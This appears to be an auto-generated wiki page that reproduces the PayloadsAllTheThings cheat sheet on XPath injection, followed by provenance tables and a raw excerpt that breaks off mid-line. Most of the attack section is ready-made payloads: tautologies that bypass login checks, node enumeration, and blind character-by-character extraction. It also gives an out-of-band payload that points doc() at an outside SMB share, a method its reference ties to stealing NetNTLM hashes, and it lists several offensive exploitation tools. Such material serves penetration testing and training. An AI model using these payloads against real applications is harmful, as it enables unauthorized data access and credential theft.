---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# XPATH Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-xpath-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XPATH Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.

## Preserved Body

````markdown
> XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.

## Tools

* [orf/xcat](https://github.com/orf/xcat) - Automate XPath injection attacks to retrieve documents
* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool
* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text
* [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool

## Methodology

Similar to SQL injection, you want to terminate the query properly:

```ps1
string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
```

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

### Blind Exploitation

1. Size of a string

    ```sql
    and string-length(account)=SIZE_INT
    ```

2. Access a character with `substring`, and verify its value the `codepoints-to-string` function

    ```sql
    substring(//user[userid=5]/username,2,1)=CHAR_HERE
    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
    ```

### Out Of Band Exploitation

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

## Labs

* [Root Me - XPath injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
* [Root Me - XPath injection - String](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
* [Root Me - XPath injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)

## References

* [Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017](https://web.archive.org/web/20170325082934/http://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [XPATH Injection - OWASP - January 21, 2015](https://web.archive.org/web/20240217030110/http://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
````

## Source Verification

[source record](../../sources/payloadsallthethings/xpath-injection.md)

## Evidence Excerpt

````text
_body: "# XPATH Injection\n\n> XPath Injection is an attack technique used to exploit applications that construct XPath (XML\
\ Path Language) queries from user-supplied input to query or navigate XML documents.\n\n## Summary\n\n* [Tools](#tools)\n\
* [Methodology](#methodology)\n    * [Blind Exploitation](#blind-exploitation)\n    * [Out Of Band Exploitation](#out-of-band-exploitation)\n\
* [Labs](#labs)\n* [References](#references)\n\n## Tools\n\n* [orf/xcat](https://github.com/orf/xcat) - Automate XPath injection\
\ attacks to retrieve documents\n* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool\n* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart)\
\ - A fork of xxxpwn using predictive text\n* [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)\n\
* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool\n\n## Methodology\n\nSimilar\
\ to SQL injection, you want to terminate the query properly:\n\n```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and\
````
